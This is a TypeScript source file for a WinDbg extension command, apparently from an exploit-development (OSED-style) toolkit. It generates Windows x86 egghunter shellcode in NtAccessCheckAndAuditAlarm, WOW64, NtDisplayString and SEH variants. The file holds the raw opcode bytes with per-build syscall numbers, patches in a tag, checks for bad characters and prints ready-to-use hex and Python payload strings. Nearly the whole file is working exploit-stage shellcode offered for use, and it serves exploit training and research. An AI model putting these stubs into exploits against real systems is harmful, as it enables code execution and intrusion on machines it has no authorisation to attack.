import { Command, CommandResult } from "../core/registry";
import * as out from "../core/output";

type EggMode = "ntaccess" | "ntdisplay" | "seh";

type EggOptions = {
  tag: string;
  mode: EggMode;
  wow64: boolean;
  badchars: number[];
  os: string | null;
  syscall: number | null;
};

type OsRow = {
  key: string;
  label: string;
  builds: string[];
  // NtAccessCheckAndAuditAlarm on a native 32-bit kernel (int 0x2e stub).
  ntaccess32?: number;
  // NtAccessCheckAndAuditAlarm on a 64-bit kernel, reached from WOW64 through fs:[0xC0].
  ntaccess64?: number;
  // NtDisplayString on a native 32-bit kernel.
  ntdisplay32?: number;
};

// Syscall numbers from j00ru's Windows syscall tables:
// https://j00ru.vexillium.org/syscalls/nt/32/ and https://j00ru.vexillium.org/syscalls/nt/64/
// (data: https://github.com/j00ru/windows-syscalls, x86 and x64 nt-per-syscall.json).
// ntaccess64 is listed only for Windows 10 and 11: earlier WOW64 gates take the
// argument pointer in edx and a thunk index in ecx, which the WOW64 stub does not set.
const OS_TABLE: OsRow[] = [
  { key: "xp", label: "Windows XP", builds: ["2600"], ntaccess32: 0x02, ntdisplay32: 0x43 },
  { key: "2003", label: "Windows Server 2003", builds: ["3790"], ntaccess32: 0x02, ntdisplay32: 0x46 },
  { key: "vista", label: "Windows Vista", builds: ["6000", "6001", "6002"], ntaccess32: 0x02, ntdisplay32: 0x80 },
  { key: "win7", label: "Windows 7", builds: ["7600", "7601"], ntaccess32: 0x02, ntdisplay32: 0x6d },
  { key: "win8", label: "Windows 8", builds: ["9200"], ntaccess32: 0x1aa, ntdisplay32: 0x131 },
  { key: "win8.1", label: "Windows 8.1", builds: ["9600", "win81"], ntaccess32: 0x1af, ntdisplay32: 0x135 },
  { key: "win10-1507", label: "Windows 10 1507", builds: ["10240"], ntaccess32: 0x1b7, ntaccess64: 0x29, ntdisplay32: 0x13a },
  { key: "win10-1511", label: "Windows 10 1511", builds: ["10586"], ntaccess32: 0x1ba, ntaccess64: 0x29, ntdisplay32: 0x13c },
  { key: "win10-1607", label: "Windows 10 1607", builds: ["14393"], ntaccess32: 0x1bc, ntaccess64: 0x29, ntdisplay32: 0x13e },
  { key: "win10-1703", label: "Windows 10 1703", builds: ["15063"], ntaccess32: 0x1c2, ntaccess64: 0x29, ntdisplay32: 0x141 },
  { key: "win10-1709", label: "Windows 10 1709", builds: ["16299"], ntaccess32: 0x1c6, ntaccess64: 0x29, ntdisplay32: 0x144 },
  { key: "win10-1803", label: "Windows 10 1803", builds: ["17134"], ntaccess32: 0x1c6, ntaccess64: 0x29, ntdisplay32: 0x144 },
  { key: "win10-1809", label: "Windows 10 1809", builds: ["17763"], ntaccess32: 0x1c6, ntaccess64: 0x29, ntdisplay32: 0x143 },
  { key: "win10-1903", label: "Windows 10 1903", builds: ["18362"], ntaccess32: 0x1c6, ntaccess64: 0x29, ntdisplay32: 0x143 },
  { key: "win10-1909", label: "Windows 10 1909", builds: ["18363"], ntaccess32: 0x1c6, ntaccess64: 0x29, ntdisplay32: 0x143 },
  { key: "win10-2004", label: "Windows 10 2004", builds: ["19041"], ntaccess32: 0x1c8, ntaccess64: 0x29, ntdisplay32: 0x143 },
  { key: "win10-20h2", label: "Windows 10 20H2", builds: ["19042"], ntaccess32: 0x1c8, ntaccess64: 0x29, ntdisplay32: 0x143 },
  { key: "win10-21h1", label: "Windows 10 21H1", builds: ["19043"], ntaccess32: 0x1c8, ntaccess64: 0x29, ntdisplay32: 0x143 },
  { key: "win10-21h2", label: "Windows 10 21H2", builds: ["19044"], ntaccess32: 0x1c9, ntaccess64: 0x29, ntdisplay32: 0x143 },
  { key: "win10-22h2", label: "Windows 10 22H2", builds: ["19045", "win10"], ntaccess32: 0x1c9, ntaccess64: 0x29, ntdisplay32: 0x143 },
  { key: "win11", label: "Windows 11", builds: ["22000", "22621", "22631", "26100", "26200"], ntaccess64: 0x29 },
];

type StubKind = "ntaccess32" | "ntaccess64" | "ntdisplay32";

const DEFAULT_OS: Record<StubKind, string> = {
  ntaccess32: "win10-22h2",
  ntaccess64: "win10-22h2",
  ntdisplay32: "xp",
};

const SERVICE_NAME: Record<StubKind, string> = {
  ntaccess32: "NtAccessCheckAndAuditAlarm",
  ntaccess64: "NtAccessCheckAndAuditAlarm",
  ntdisplay32: "NtDisplayString",
};

function findOs(name: string): OsRow | undefined {
  const needle = name.trim().toLowerCase();
  return OS_TABLE.find((row) => row.key === needle || row.builds.includes(needle));
}

function hex(value: number): string {
  return `0x${value.toString(16).toUpperCase()}`;
}

type ResolvedSyscall = { number: number; source: string; warning?: string };

function resolveSyscall(kind: StubKind, os: string | null, syscall: number | null): ResolvedSyscall {
  if (syscall !== null) {
    return { number: syscall, source: "explicit" };
  }
  const row = os === null ? undefined : findOs(os);
  const number = row?.[kind];
  if (row && number !== undefined) {
    return { number, source: row.label };
  }
  const fallback = findOs(DEFAULT_OS[kind])!;
  const fallbackNumber = fallback[kind]!;
  const known = OS_TABLE.filter((entry) => entry[kind] !== undefined).map((entry) => entry.key).join(", ");
  const reason = os === null
    ? "No os given"
    : row
      ? `No ${SERVICE_NAME[kind]} number for ${row.label} in this stub`
      : `Unknown os "${os}"`;
  return {
    number: fallbackNumber,
    source: fallback.label,
    warning: `${reason}; using ${hex(fallbackNumber)} (${fallback.label}). Pass os (${known}) or syscall, or read the number with u ntdll!${SERVICE_NAME[kind]} L1.`,
  };
}

// NtAccessCheckAndAuditAlarm egghunter (INT 0x2E). 34 bytes.
// Scans page-by-page using the syscall for access checks, then dword-by-dword
// with scasd for double-tag matching.
// Uses mov eax,imm32 for the syscall number so it works with any value
// (Win10 builds use 0x1C9+, which doesn't fit in push imm8).
// Syscall number at offset 8, tag at offset 20.
const NTACCESS_X86: number[] = [
  0x66, 0x81, 0xca, 0xff, 0x0f, // or dx, 0x0fff
  0x42,                         // inc edx
  0x52,                         // push edx
  0xb8, 0xc9, 0x01, 0x00, 0x00, // mov eax, 0x1C9
  0xcd, 0x2e,                   // int 0x2e
  0x3c, 0x05,                   // cmp al, 0x5
  0x5a,                         // pop edx
  0x74, 0xed,                   // je short (back to or dx)
  0xb8, 0x54, 0x30, 0x30, 0x57, // mov eax, <TAG>
  0x8b, 0xfa,                   // mov edi, edx
  0xaf,                         // scasd
  0x75, 0xe8,                   // jne short (back to inc edx)
  0xaf,                         // scasd
  0x75, 0xe5,                   // jne short (back to inc edx)
  0xff, 0xe7,                   // jmp edi
];

// WOW64 variant. int 0x2e in a WOW64 process raises STATUS_ILLEGAL_INSTRUCTION,
// so this stub calls the 64-bit service through the WOW64 gate at fs:[0xC0], as the
// 32-bit ntdll does on Windows 10 and 11 (mov eax, 0x29 ; call Wow64SystemServiceCall).
// The gate reads arguments from [esp+8]: the stub pushes the probed address twice
// (return-address slot and SubsystemName) above ten zeroed arguments, and gets
// STATUS_ACCESS_VIOLATION (al = 5) when the address is not readable.
// Syscall number at offset 23, tag at offset 37. 51 bytes.
const NTACCESS_WOW64: number[] = [
  0x33, 0xdb,                   // xor ebx, ebx
  0x53, 0x53, 0x53, 0x53, 0x53, // push ebx x10 (zeroed arguments 2-11)
  0x53, 0x53, 0x53, 0x53, 0x53,
  0xb3, 0xc0,                   // mov bl, 0xc0
  0x66, 0x81, 0xca, 0xff, 0x0f, // or dx, 0x0fff
  0x42,                         // inc edx
  0x52,                         // push edx (SubsystemName = probed address)
  0x52,                         // push edx (return-address slot)
  0xb8, 0x29, 0x00, 0x00, 0x00, // mov eax, 0x29
  0x64, 0xff, 0x13,             // call dword ptr fs:[ebx]
  0x5a,                         // pop edx
  0x5a,                         // pop edx
  0x3c, 0x05,                   // cmp al, 0x5
  0x74, 0xea,                   // je short (back to or dx)
  0xb8, 0x54, 0x30, 0x30, 0x57, // mov eax, <TAG>
  0x8b, 0xfa,                   // mov edi, edx
  0xaf,                         // scasd
  0x75, 0xe5,                   // jne short (back to inc edx)
  0xaf,                         // scasd
  0x75, 0xe2,                   // jne short (back to inc edx)
  0xff, 0xe7,                   // jmp edi
];

// NtDisplayString egghunter (INT 0x2E). 32 bytes.
// Classic Skape variant: uses `push imm8 ; pop eax` for the syscall number
// instead of `mov eax, imm32`, saving 2 bytes and avoiding the null bytes
// that plague small syscall numbers in the imm32 encoding. Only works when
// the syscall number fits in a signed byte (0x01-0x7F), which holds up to
// Windows 7; Windows 8 and later need the ntaccess mode.
// Syscall byte at offset 8, tag at offset 18.
const NTDISPLAY_X86: number[] = [
  0x66, 0x81, 0xca, 0xff, 0x0f, // or dx, 0x0fff
  0x42,                         // inc edx
  0x52,                         // push edx
  0x6a, 0x43,                   // push 0x43  (NtDisplayString syscall)
  0x58,                         // pop eax
  0xcd, 0x2e,                   // int 0x2e
  0x3c, 0x05,                   // cmp al, 0x5
  0x5a,                         // pop edx
  0x74, 0xef,                   // je short (back to or dx)
  0xb8, 0x54, 0x30, 0x30, 0x57, // mov eax, <TAG>
  0x8b, 0xfa,                   // mov edi, edx
  0xaf,                         // scasd
  0x75, 0xea,                   // jne short (back to inc edx)
  0xaf,                         // scasd
  0x75, 0xe7,                   // jne short (back to inc edx)
  0xff, 0xe7,                   // jmp edi
];

const TAG_OFFSET_NTDISPLAY = 18;
const SYSCALL_OFFSET_NTDISPLAY = 8;

// SEH-based egghunter. 70 bytes. Position-independent via call $+5/pop.
// Installs a custom exception handler that catches ACCESS_VIOLATION from scasd
// and resumes at the next page. No syscall-number dependency, so it's portable
// across Windows versions.
//
// Layout:
//   [0x00] jmp short install_seh (skip handler)
//   [0x02] handler: reads ContextRecord from stdcall args, computes scan_loop
//          address from EstablisherFrame→Handler, sets Eip, returns
//          EXCEPTION_CONTINUE_EXECUTION.
//   [0x19] install_seh: gets handler address via call/pop, installs SEH frame.
//   [0x2D] scan_loop: or di,0xfff (handler resumes here → next page)
//   [0x32] next_addr: inc edi (jnz resumes here → next dword)
//          mov eax, TAG; scasd; jnz next_addr; scasd; jnz next_addr;
//          restore old SEH; jmp edi.
//
// Tag at offset 0x34. Contains null bytes (offsets 0x13-0x15, 0x1C-0x1F).
const SEH_EGGHUNTER: number[] = [
  // jmp short install_seh
  0xeb, 0x17,
  // handler (offset 0x02, 23 bytes)
  0x8b, 0x4c, 0x24, 0x0c,             // mov ecx, [esp+0x0C]      (ContextRecord)
  0x8b, 0x44, 0x24, 0x08,             // mov eax, [esp+0x08]      (EstablisherFrame)
  0x8b, 0x40, 0x04,                   // mov eax, [eax+0x04]      (handler address)
  0x83, 0xc0, 0x2b,                   // add eax, 0x2B            (scan_loop = handler+43)
  0x89, 0x81, 0xb8, 0x00, 0x00, 0x00, // mov [ecx+0xB8], eax     (set Eip = scan_loop)
  0x31, 0xc0,                         // xor eax, eax             (EXCEPTION_CONTINUE_EXECUTION)
  0xc3,                               // ret
  // install_seh (offset 0x19)
  0x31, 0xd2,                         // xor edx, edx
  0xe8, 0x00, 0x00, 0x00, 0x00,       // call $+5
  0x5e,                               // pop esi                  (esi = addr of this pop)
  0x83, 0xee, 0x1e,                   // sub esi, 0x1E            (esi = handler addr)
  0x56,                               // push esi                 (handler)
  0x64, 0xff, 0x32,                   // push dword ptr fs:[edx]  (old SEH)
  0x64, 0x89, 0x22,                   // mov dword ptr fs:[edx], esp
  0x31, 0xff,                         // xor edi, edi             (scan from 0)
  // scan_loop (offset 0x2D) — handler resumes here (next page)
  0x66, 0x81, 0xcf, 0xff, 0x0f,       // or di, 0x0FFF
  // next_addr (offset 0x32) — jnz resumes here (next dword)
  0x47,                               // inc edi
  0xb8, 0x54, 0x30, 0x30, 0x57,       // mov eax, <TAG>           (tag at offset 0x34)
  0xaf,                               // scasd
  0x75, 0xf7,                         // jnz next_addr            (0x32)
  0xaf,                               // scasd
  0x75, 0xf4,                         // jnz next_addr            (0x32)
  // found — restore old SEH and jump
  0x64, 0x8f, 0x02,                   // pop dword ptr fs:[edx]
  0x83, 0xc4, 0x04,                   // add esp, 0x04
  0xff, 0xe7,                         // jmp edi
];

const TAG_OFFSET_NTACCESS = 20;
const TAG_OFFSET_NTACCESS_WOW64 = 37;
const TAG_OFFSET_SEH = 0x34;

const SYSCALL_OFFSET_NTACCESS = 8;
const SYSCALL_OFFSET_NTACCESS_WOW64 = 23;

function uniqueBytes(values: number[] | undefined): number[] {
  const seen = new Set<number>();
  for (const v of values ?? []) {
    if (Number.isInteger(v) && v >= 0 && v <= 0xff) seen.add(v & 0xff);
  }
  return [...seen].sort((a, b) => a - b);
}

function checkBadchars(bytes: number[], label: string, badSet: Set<number>): string[] {
  const hits: string[] = [];
  for (let i = 0; i < bytes.length; i++) {
    if (badSet.has(bytes[i])) {
      hits.push(`byte 0x${bytes[i].toString(16).toUpperCase().padStart(2, "0")} at offset ${i} in ${label}`);
    }
  }
  return hits;
}

function tagBytes(tag: string): number[] {
  return tag.padEnd(4, "X").slice(0, 4).split("").map((c) => c.charCodeAt(0));
}

function dwordLE(val: number): number[] {
  return [val & 0xff, (val >> 8) & 0xff, (val >> 16) & 0xff, (val >> 24) & 0xff];
}

export type EgghunterResult = {
  bytes: number[];
  size: number;
  badcharHits: string[];
  syscallUsed: number | null;
  syscallSource: string | null;
  osWarning: string | null;
};

export function buildEgghunter(options: EggOptions): EgghunterResult {
  const tag = tagBytes(options.tag);
  const badSet = new Set(uniqueBytes(options.badchars));

  let template: number[];
  let tagOffset: number;
  let syscallOffset: number | null = null;
  let kind: StubKind | null = null;
  let label: string;

  if (options.mode === "seh") {
    template = [...SEH_EGGHUNTER];
    tagOffset = TAG_OFFSET_SEH;
    label = "seh egghunter";
  } else if (options.mode === "ntdisplay") {
    if (options.wow64) {
      throw new Error('ntdisplay has no WOW64 stub: int 0x2e raises STATUS_ILLEGAL_INSTRUCTION in a WOW64 process. Use mode "ntaccess" with wow64 = true.');
    }
    template = [...NTDISPLAY_X86];
    tagOffset = TAG_OFFSET_NTDISPLAY;
    syscallOffset = SYSCALL_OFFSET_NTDISPLAY;
    kind = "ntdisplay32";
    label = "ntdisplay egghunter";
  } else if (options.wow64) {
    template = [...NTACCESS_WOW64];
    tagOffset = TAG_OFFSET_NTACCESS_WOW64;
    syscallOffset = SYSCALL_OFFSET_NTACCESS_WOW64;
    kind = "ntaccess64";
    label = "ntaccess wow64 egghunter";
  } else {
    template = [...NTACCESS_X86];
    tagOffset = TAG_OFFSET_NTACCESS;
    syscallOffset = SYSCALL_OFFSET_NTACCESS;
    kind = "ntaccess32";
    label = "ntaccess egghunter";
  }

  template.splice(tagOffset, 4, ...tag);

  let resolved: ResolvedSyscall | null = null;
  if (syscallOffset !== null && kind !== null) {
    resolved = resolveSyscall(kind, options.os, options.syscall);
    if (kind === "ntdisplay32") {
      if (resolved.number < 0x01 || resolved.number > 0x7f) {
        throw new Error(`NtDisplayString number ${hex(resolved.number)} (${resolved.source}) does not fit the push imm8 in the ntdisplay stub (0x01-0x7F). Use mode "ntaccess".`);
      }
      template.splice(syscallOffset, 1, resolved.number);
    } else {
      template.splice(syscallOffset, 4, ...dwordLE(resolved.number));
    }
  }

  const badcharHits = checkBadchars(template, label, badSet);
  return {
    bytes: template,
    size: template.length,
    badcharHits,
    syscallUsed: resolved?.number ?? null,
    syscallSource: resolved?.source ?? null,
    osWarning: resolved?.warning ?? null,
  };
}

function bytesToHex(bytes: number[]): string {
  return bytes.map((v) => v.toString(16).toUpperCase().padStart(2, "0")).join("");
}

function bytesToPython(bytes: number[]): string {
  return `b"${bytes.map((v) => `\\x${v.toString(16).padStart(2, "0")}`).join("")}"`;
}

export function createEgghunterCommand(): Command {
  return {
    name: "egghunter",
    description: "Generate NtAccess/SEH egghunter stubs with badchar checking.",
    usage: "dx @$osed().egghunter(tag?, mode?, wow64?, badchars?, os?, syscall?)",
    examples: [
      'dx @$osed().egghunter("W00T", "ntaccess", false, "", "win10-1909")',
      'dx @$osed().egghunter("W00T", "ntaccess", true, "00 0A 0D", "win10")',
      'dx @$osed().egghunter("W00T", "ntaccess", false, "", "", 0x1c8)',
      'dx @$osed().egghunter("W00T", "ntdisplay", false, "00 0A 0D", "win7")',
      'dx @$osed().egghunter("B33F", "seh")',
    ],
    schema: {
      tag: { type: "string", default: "W00T" },
      mode: { type: "string", enum: ["ntaccess", "ntdisplay", "seh"], default: "ntaccess" },
      wow64: { type: "boolean", default: false },
      badchars: { type: "array", default: [] },
      os: { type: "string" },
      syscall: { type: "number", min: 0, max: 0xffffffff },
    },
    execute(options: Record<string, unknown>): CommandResult {
      const opts: EggOptions = {
        tag: (options.tag as string) ?? "W00T",
        mode: (options.mode as EggMode) ?? "ntaccess",
        wow64: (options.wow64 as boolean) ?? false,
        badchars: (options.badchars as number[]) ?? [],
        os: (options.os as string | undefined) || null,
        syscall: (options.syscall as number | undefined) ?? null,
      };

      const result = buildEgghunter(opts);

      out.section("Egghunter");
      const sysLabel = result.syscallUsed !== null ? ` | Syscall: ${hex(result.syscallUsed)} (${result.syscallSource})` : "";
      out.info(`Tag: ${opts.tag} | Mode: ${opts.mode}${opts.wow64 ? " (WoW64)" : ""} | Size: ${result.size} bytes${sysLabel}`);
      if (result.osWarning) {
        out.warn(result.osWarning);
      }
      out.print(bytesToHex(result.bytes));
      out.print(bytesToPython(result.bytes));
      if (result.badcharHits.length > 0) {
        for (const hit of result.badcharHits) {
          out.warn(`Badchar: ${hit}`);
        }
      }

      return {
        command: "egghunter",
        args: options,
        success: result.badcharHits.length === 0,
        findings: [result],
        warnings: result.osWarning ? [result.osWarning, ...result.badcharHits] : result.badcharHits,
        errors: [],
      };
    },
  };
}
